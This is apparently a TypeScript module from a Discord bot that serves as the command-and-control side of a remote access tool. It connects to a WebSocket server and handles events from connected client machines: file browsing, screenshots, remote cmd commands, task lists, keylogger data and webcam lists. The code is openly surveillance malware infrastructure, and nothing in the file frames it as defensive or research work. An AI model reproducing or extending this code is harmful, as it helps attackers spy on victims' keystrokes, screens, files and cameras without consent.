import type { DiscordClient } from "@/clients/DiscordClient";
import { Logger } from "@/shared/Logger";
import { io, type Socket } from "socket.io-client";
import {
	WsConnectionsEvents,
	WsScreenshotEvents,
	WsFilesEvents,
	WsOthersEvents,
	WsExplorerEvents
} from "./events";


export default class WsService {
	private static currentSocket: Socket | null = null;

	static cleanup() {
		if (this.currentSocket) {
			this.currentSocket.removeAllListeners();
			this.currentSocket.disconnect();
			this.currentSocket = null;
		}
	}

	static async startWsServer(client: DiscordClient): Promise<Socket> {
		this.cleanup(); // Clean up any existing connection
		const ws = io(`${process.env.WSS_URL}/bot`, {
			transports: ["websocket"],

			auth: {
				token: process.env.API_TOKEN
			}
		});

		this.currentSocket = ws;

		const wsExplorerEvents = new WsExplorerEvents(client);
		const wsConnectionEvents = new WsConnectionsEvents(client);
		const wsScreenshotEvents = new WsScreenshotEvents(client);
		const wsFilesEvents = new WsFilesEvents(client);
		const wsOthersEvents = new WsOthersEvents(client);

		ws.on("getFilesFolder", wsExplorerEvents.getExplorer);

		ws.on("disconnectedClient", wsConnectionEvents.disconnect);

		ws.on("connectedClient", wsConnectionEvents.connection);

		ws.on("sendScreenshotToBot", wsScreenshotEvents.getScreenshot);

		ws.on("sendScreensToBot", wsScreenshotEvents.getScreens);

		ws.on("sendImageToController", wsFilesEvents.getImageFromClient);

		// ws.on("downloadFile", wsFilesEvents.reciveFile);

		ws.on("getTasksFromClient", wsOthersEvents.getTasksFromClient);

		ws.on("getCmdCommand", wsOthersEvents.getCmdCommand);

		ws.on("addFriend", wsOthersEvents.addFriend);
		// ws.on("message", wsOthersEvents.reciveMessage);

		ws.on("sendKeyLogger", wsOthersEvents.reciveKeyLogger);

		ws.on("getWebcams", wsOthersEvents.getWebcams);

		// ws.on("getWebcamScreenshot", wsOthersEvents.getWebcamScreenshot)

		ws.on("close", () => {
			Logger.warn("Disconnected from WebSocket server");
		});

		ws.onAny((event, ...args) => {
			Logger.info(`WebSocket event: ${event}`, args);
		})
		return ws;
	}
}
